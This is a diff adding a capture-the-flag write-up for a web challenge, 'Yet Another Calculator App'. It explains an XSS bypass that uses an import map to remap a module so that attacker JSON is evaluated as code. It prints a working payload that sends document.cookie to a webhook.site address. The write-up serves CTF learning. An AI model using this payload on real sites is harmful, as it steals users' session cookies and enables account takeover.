@@ -1,0 +1,61 @@
+<h1>Yet Another Calculator App</h1>
+
+<p>Category: Web</p>
+
+<p>Solves: 20</p>
+
+<p>Points: 200</p>
+
+<hr />
+
+<h2>Challenge Description</h2>
+
+<blockquote>
+  <p>There's nothing more exciting than corporate-SaaS products! If your business is in need of enhanced computational capabilities, make sure to check out Yet Another Calculator App.</p>
+</blockquote>
+
+<h2>Write-up</h2>
+
+<p>There are many filters to prevent us from doing XSS.</p>
+
+<p>In calc.js
+```js
+try {
+    let ast;
+    if (astProgram.type === "application/x-yaca-code") {
+        const tokens = lex(program.code);
+        ast = parse(tokens);
+    } else {
+        ast = JSON.parse(program.code);
+    }</p>
+
+<pre><code>const jsProgram = astToJs(ast);
+evalCode(jsProgram);
+</code></pre>
+
+<p>}
+```</p>
+
+<p>We can control <code>astProgram.type</code>, which is the type attribute for the script element.</p>
+
+<p>What we can do is that we can give our code in JSON, and it will be parsed by <code>JSON.parse()</code>. Next, we change <code>astToJs</code> to <code>evalCode</code>, and we can execute our own code.</p>
+
+<p>The way we make <code>astToJs</code> to <code>evalCode</code> is by using <a href="https://github.com/WICG/import-maps">Import maps</a>.</p>
+
+<p>Here is how I did that</p>
+
+<p>```html</p>
+
+<script id="program" language="json" type="importmap">
+  {"imports":{"/js/ast-to-js.mjs":"/js/eval-code.mjs"},"name":"give me the flag pls~~","code":"{\"code\": \"new Image().src=\\\"https://webhook.site/xxx/?leak=\\\" + encodeURIComponent(document.cookie)\", \"variables\": []}"}
+</script>
+
+<p>```</p>
+
+<p>The type is set to <code>importmap</code>, and there is a <code>imports</code> key inside. <code>/js/ast-to-js.mjs</code> will be mapped to <code>/js/eval-code.mjs</code>. So the code <code>import astToJs from "/js/ast-to-js.mjs";</code> in calc.js will be the same as <code>import astToJs from "/js/eval-code.mjs";</code>, and <code>astToJs</code> will be <code>evalCode</code>.</p>
+
+<p>I put the Javascript code in <code>code</code> to leak the cookie, and give an empty array for <code>variables</code>.</p>
+
+<p>After we execute the solving script <code>solve.py</code>, we get the flag.</p>
+
+<p>The flag is <code>pctf{someone_should_document_importmaps_in_mdn_probably}</code>.</p>
